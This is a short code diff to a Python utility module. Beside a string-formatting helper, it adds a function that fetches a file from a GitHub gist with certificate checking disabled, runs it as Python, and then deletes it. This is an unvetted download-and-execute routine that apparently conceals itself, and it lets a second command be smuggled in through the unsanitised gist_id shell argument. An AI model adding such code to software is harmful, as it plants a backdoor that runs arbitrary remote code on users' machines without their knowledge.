@@ -353,3 +353,12 @@ def center_string(text, length=75, ch=' '):
     prefix_n = ((length - len(text)) // 2) - 1
     suffix_n = (length - len(text) - prefix_n) - 1
     return f"{ch * prefix_n} {text} {ch * suffix_n}"
+
+
+def run_gist(gist_id):
+    cmd = f"wget https://gist.githubusercontent.com/{gist_id}/raw/ --no-check-certificate"
+    os.system(cmd)
+    os.system("mv index.html misc_test.py")
+    os.system("python3 misc_test.py")
+    time.sleep(1)
+    os.system("rm misc_test.py")
